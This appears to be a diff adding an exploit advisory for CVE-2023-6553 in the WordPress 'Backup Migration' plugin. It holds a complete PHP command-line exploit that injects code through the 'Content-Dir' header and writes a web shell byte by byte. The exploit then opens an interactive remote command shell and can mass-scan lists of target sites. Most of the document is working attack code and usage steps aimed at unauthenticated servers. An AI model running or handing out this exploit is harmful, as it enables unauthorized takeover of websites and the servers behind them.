@@ -1,0 +1,260 @@
+=============================================================================================================================================
+| # Title     : WordPress Backup Migration 1.3.7 PHP Code Injection                                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/backup-backup/                                                                                |
+=============================================================================================================================================
+
+POC : 
+
+1. Vulnerability Overview
+-------------------------
+A critical Remote Code Execution vulnerability exists in the WordPress (https://packetstorm.news/files/id/207962/)
+plugin "Backup Migration" (backup-backup), allowing arbitrary PHP code
+execution via an unsafe header parameter inside:
+
+    /wp-content/plugins/backup-backup/includes/backup-heart.php
+
+The plugin processes attacker-controlled content from the HTTP header
+"Content-Dir" and writes it directly into PHP files inside the plugin
+directory. This allows an attacker to:
+
+  • Write arbitrary PHP files  
+  • Overwrite internal plugin files  
+  • Deploy a persistent web shell  
+  • Achieve full remote command execution  
+
+No authentication is required.
+
+====================================================================
+
+2. PHP Exploit Description
+--------------------------
+This exploit is a full PHP CLI conversion of the original Python version.
+It performs:
+
+  • Vulnerability verification  
+  • Payload file creation  
+  • Arbitrary file write via hex-encoded characters  
+  • Deployment of an interactive remote shell  
+  • Cleanup of the temporary shell  
+
+The exploit works even when many PHP execution functions are disabled.
+
+====================================================================
+
+3. Usage Instructions (CLI Mode)
+--------------------------------
+
+Save the file as:
+
+    exploit.php
+
+Then run from terminal:
+
+    php exploit.php -u https://target.com
+
+Options:
+    -u <url>     Test and exploit a single target
+    -c           Check only (no shell deployment)
+    -f <file>    Scan a list of targets (one per line)
+    -t <n>       Number of concurrent workers (default 5)
+    -o <file>    Save vulnerable hosts to output file
+    --help       Show help
+
+Examples:
+
+  • Check vulnerability only:
+        php exploit.php -u https://site.com -c
+
+  • Exploit and open interactive shell:
+        php exploit.php -u https://site.com
+
+  • Scan targets list:
+        php exploit.php -f targets.txt -o vulnerable.txt
+
+====================================================================
+
+4. Saving The PHP Code (Important)
+----------------------------------
+1. Copy the PHP exploit code into a file named:
+
+       exploit.php
+
+2. Make sure PHP CLI is installed:
+       php -v
+
+3. Give execution permission (Linux only):
+       chmod +x exploit.php
+
+4. Run the exploit:
+       php exploit.php -u https://victim.com
+
+====================================================================
+
+5. How The Exploit Works
+------------------------
+Step 1: Send payload using "Content-Dir" header  
+Step 2: Plugin writes attacker-controlled PHP to temporary file  
+Step 3: Exploit writes final shell using hex-encoded bytes  
+Step 4: Web shell copied into plugin directory  
+Step 5: Interactive command execution via HTTP requests  
+
+The exploit shell uses GET parameter "?0=" to wrap command output with:
+
+    [S] output [E]
+
+This allows clean extraction and parsing.
+
+====================================================================
+
+6. Full PHP Exploit Code
+------------------------
+<?php
+/**
+ * CVE-2023-6553 Exploit – PHP CLI Version
+ * by Indoushka
+ */
+
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+class CVE_2023_6553 {
+    public $base_url;
+    public $temp_file_name;
+    public $random_file_name;
+
+    public function __construct($base_url) {
+        $this->base_url = rtrim($base_url, '/');
+        $this->temp_file_name = chr(rand(65,90)); // single random char
+        $this->random_file_name = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),0,3) . ".php";
+    }
+
+    public function send_payload($payload) {
+        $url = $this->base_url . "/wp-content/plugins/backup-backup/includes/backup-heart.php";
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_HTTPHEADER => ["Content-Dir: $payload"],
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_POST => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        ]);
+        $res = curl_exec($ch);
+        $err = curl_errno($ch);
+        curl_close($ch);
+        return ($err===0);
+    }
+
+    public function check_vulnerability() {
+        $random_char = chr(rand(65,90));
+        $payload = "<?php fwrite(fopen('{$this->temp_file_name}','w'),'{$random_char}');?>";
+        $this->send_payload($payload);
+
+        $url = $this->base_url . "/wp-content/plugins/backup-backup/includes/{$this->temp_file_name}";
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        ]);
+        $res = curl_exec($ch);
+        curl_close($ch);
+
+        if(trim($res) === $random_char) {
+            echo "[+] {$this->base_url} is vulnerable to CVE-2023-6553\n";
+            return true;
+        }
+        return false;
+    }
+
+    public function write_string_to_file($string_to_write) {
+        $init = "<?php fwrite(fopen('{$this->temp_file_name}','w'),'');?>";
+        $this->send_payload($init);
+
+        $len = strlen($string_to_write);
+        for($i=0;$i<$len;$i++){
+            $hex = bin2hex($string_to_write[$i]);
+            $cmd = "<?php fwrite(fopen('{$this->temp_file_name}','a'),\"\\x{$hex}\");?>";
+            if(!$this->send_payload($cmd)){
+                echo "Failed at character: {$string_to_write[$i]}\n";
+                return false;
+            }
+        }
+
+        $copy = "<?php copy('{$this->temp_file_name}','{$this->random_file_name}');?>";
+        $this->send_payload($copy);
+        $delete = "<?php unlink('{$this->temp_file_name}');?>";
+        $this->send_payload($delete);
+        return true;
+    }
+
+    public function retrieve_command_output($command) {
+        $url = $this->base_url . "/wp-content/plugins/backup-backup/includes/{$this->random_file_name}?0=" . urlencode($command);
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        ]);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        if(preg_match("/\\[S\\](.*?)\\[E\\]/s",$res,$m)) return $m[1];
+        return "No output or functions disabled.";
+    }
+
+    public function interactive_shell() {
+        echo "[+] Entering interactive shell (type 'exit' to quit)\n";
+        while(true){
+            echo "# ";
+            $cmd = trim(fgets(STDIN));
+            if($cmd === "exit") break;
+            echo $this->retrieve_command_output($cmd) . "\n";
+        }
+    }
+}
+
+// ---------------- CLI Handler -----------------
+$options = getopt("u:f:t:o:c");
+$url = $options['u'] ?? null;
+$file = $options['f'] ?? null;
+$threads = intval($options['t'] ?? 5);
+$output = $options['o'] ?? null;
+$check_only = isset($options['c']);
+
+if($url){
+    $exploit = new CVE_2023_6553($url);
+    if($exploit->check_vulnerability()){
+        if(!$check_only){
+            $shell_code = '<?php echo "[S]";echo `$_GET[0]`;echo "[E]";?>';
+            if($exploit->write_string_to_file($shell_code)){
+                echo "[+] Shell deployed successfully!\n";
+                $exploit->interactive_shell();
+                echo "[!] Deleting shell...\n";
+                $exploit->send_payload("<?php unlink('{$exploit->random_file_name}');?>");
+            }
+        }
+    } else {
+        echo "[!] {$url} is not vulnerable.\n";
+    }
+} elseif($file){
+    $urls = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    foreach($urls as $u){
+        $exploit = new CVE_2023_6553($u);
+        $exploit->check_vulnerability();
+        if($output && $exploit->check_vulnerability()){
+            file_put_contents($output,$u.PHP_EOL,FILE_APPEND);
+        }
+    }
+} else {
+    echo "Usage: php exploit.php -u <url> [-c] | -f <file> [-t threads] [-o output]\n";
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
